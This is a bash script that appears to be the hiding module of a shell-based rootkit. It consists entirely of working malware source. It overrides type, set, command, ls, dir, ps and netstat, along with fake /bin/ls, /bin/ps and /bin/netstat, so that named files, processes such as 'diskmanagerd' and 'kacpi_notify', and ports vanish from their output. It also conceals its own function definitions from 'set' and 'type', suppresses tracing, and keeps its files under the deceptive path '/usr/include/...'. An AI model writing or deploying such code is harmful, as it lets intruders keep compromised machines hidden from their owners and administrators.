#!/bin/bash

set +v
declare -a br_hide_port=("")
declare -a br_hide_file=("emacs.sh" "kacpi_notify" "diskmanagerd")
declare -a br_hide_proc=("diskmanagerd" "kacpi_notify")
declare br_sleep_time=60
BR_ROOTKIT_PATH="/usr/include/..."

function br_hide_engine(){
    declare -a brootkit_func=(
                            "^type.*()|27" "^reset_ps.*()|8"
                            "^reset_netstat.*()|8" "^reset_ls.*()|8"
                            "^reset_command.*()|42" "^ps.*()|14"
                            "^netstat.*()|14" "^max_file_length.*()|9"
                            "^ls.*()|64" "^fake_unset.*()|10"
                            "^fake_command.*()|11"
                            "^dir.*()|3" "^command*()|26"
                            "^/usr/bin/dir.*()|5"
                            "^/bin/ps.*()|5" "^/bin/netstat.*()|5"
                            "^/bin/ls.*()|5" "^br_hide_file=|5"
                            "^set.*()|24" "^br_hide_engine.*()|30"
                            )
    local func_line br_func func_name func_num

    echo "$1" >.br.tmp
    for br_func in ${brootkit_func[*]}
    do
        func_name=`echo $br_func | cut -d "|" -f 1`
        func_num=`echo $br_func | cut -d "|" -f 2`
        func_line=`grep -n "$func_name" .br.tmp| awk -F: {'print $1'}`
        sed -i "$func_line,+$func_num d" .br.tmp >/dev/null 2>&1
    done
    cat .br.tmp; rm -f .br.tmp
}
function type(){
    case $1 in
        "set"|"type")
            echo "$1 is a shell builtin"
            return ;;
        "dir")
            echo "dir is /usr/bin/dir"
            return ;;
        "ls")
            echo "ls is aliased to ls --color=tty"
            return ;;
        "ps")
            echo "ps is /bin/ps"
            return ;;
        "netstat")
            echo "netstat is hashed (/bin/netstat)"
            return ;;
        "/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/bin/netstat")
            echo "$1 is $1"
            return ;;
        *)
            unset command
            command type $@
            reset_command
            return ;;
    esac
}
function set(){
    local fake_a
    unset command
    case $1 in
        "")
            fake_a="$(command set)"
            br_hide_engine "$fake_a"
            reset_command
            return ;;
        "-x"|"+x")
            reset_command
            return ;;
        *)
            command set $@
            reset_command
            return ;;
    esac
}
function fake_command(){
    $@
}
function command(){
    case $1 in
        "set")
            set $@
            return ;;
        "unset")
            return ;;
        "type")
            type $@
            return ;;
        "command")
            fake_command $@
            return ;;
        *)
            $@
            return ;;
    esac
}
function reset_command(){
    function command()
    {
        case $1 in
            "set")
                set $@
                return ;;
            "unset")
                return ;;
            "type")
                type $@
                return ;;
            "command")
                fake_command $@
                return ;;
            *)
                $@
                return ;;
        esac
    }
}
unalias ls >/dev/null 2>&1
function max_file_length(){
    local tmp_file sum=0 n=0
    if [ $# -eq 0 ]; then
        /bin/ls -1 >.brls.tmp
        while read tmp_file; 
        do
            n=${#tmp_file}
            [ $n -gt $sum ] && sum=$n
        done < .brls.tmp
        rm -f .brls.tmp
    else
        for tmp_file in `/bin/ls $@`
        do
            n=${#tmp_file}
            [ $n -gt $sum ] && sum=$n
        done
    fi
    ((sum=sum+1))
    return $sum
}
function ls(){
    local fake_file max_col_num file_format
    local hide_file hide_flag file_arg old_ifs
    local file_len=0 sum=0 n=0 display_mode=0

    max_col_num=`stty size|cut -d " " -f 2`
    for file_arg in $@
    do
        if echo $file_arg|grep -q -e "^-.*l.*"; then
            display_mode=1; break
        fi
    done

    case $display_mode in
        0)
            unset -f /bin/ls
            max_file_length $@
            file_len=$?

            /bin/ls -1 $@ >.brls0.tmp
            while read fake_file; 
                do
                    hide_flag=0
                    old_ifs=$IFS; IFS=","
                    for hide_file in ${br_hide_file[@]}
                    do
                        if echo "$fake_file"|grep -e "^$hide_file" >/dev/null;then
                            hide_flag=1; break
                        fi
                    done
                    IFS=$old_ifs
                    [ $hide_flag -eq  1 ] && continue
                    n=${#fake_file}
                    
                    
                    ((sum=sum+n+file_len))
                    if [ $sum -gt $max_col_num ];then
                        file_format="%-$file_len""s\n"
                        printf $file_format $fake_file
                        sum=0
                    else
                        file_format="%-$file_len""s "
                        printf $file_format $fake_file
                    fi
                done < .brls0.tmp
                rm -f .brls0.tmp

            [ $sum -le $max_col_num ] && echo ""
            reset_ls
            return ;;
        1)	
            unset -f /bin/ls

            fake_file=`/bin/ls $@`
                old_ifs=$IFS; IFS=","
                for hide_file in ${br_hide_file[@]}
                do
                fake_file=`echo "$fake_file" | sed -e '/'$hide_file'/d'`
                done
                IFS=$old_ifs
            echo "$fake_file"
            reset_ls

            return ;;
    esac
}
function dir(){
    /bin/ls $@
}
function reset_ls(){
    function /bin/ls()
    {
        unset -f /bin/ls
        ls $@
        reset_ls
    }
}
function ps(){
    local proc_name hide_proc old_ifs
    old_ifs=$IFS; IFS=","
    proc_name=`/bin/ps $@`
    for hide_proc in ${br_hide_proc[@]}
    do
        proc_name=`echo "$proc_name" | sed -e '/'$hide_proc'/d'`
    done
    echo "$proc_name"
    IFS=$old_ifs
}
function reset_ps(){
    function /bin/ps()
    {
        unset -f /bin/ps
        ps $@
        reset_ps
    }
}
function netstat(){
    local hide_port tmp_port old_ifs
    old_ifs=$IFS; IFS=","
    tmp_port=`/bin/netstat $@`
    for hide_port in ${br_hide_port[@]}
    do
        tmp_port=`echo "$tmp_port" | sed -e '/'$hide_port'/d'`
    done
    echo "$tmp_port"
    IFS=$old_ifs
}
function reset_netstat(){
    function /bin/netstat()
    {
        unset -f /bin/netstat
        netstat $@
        reset_netstat
    }
}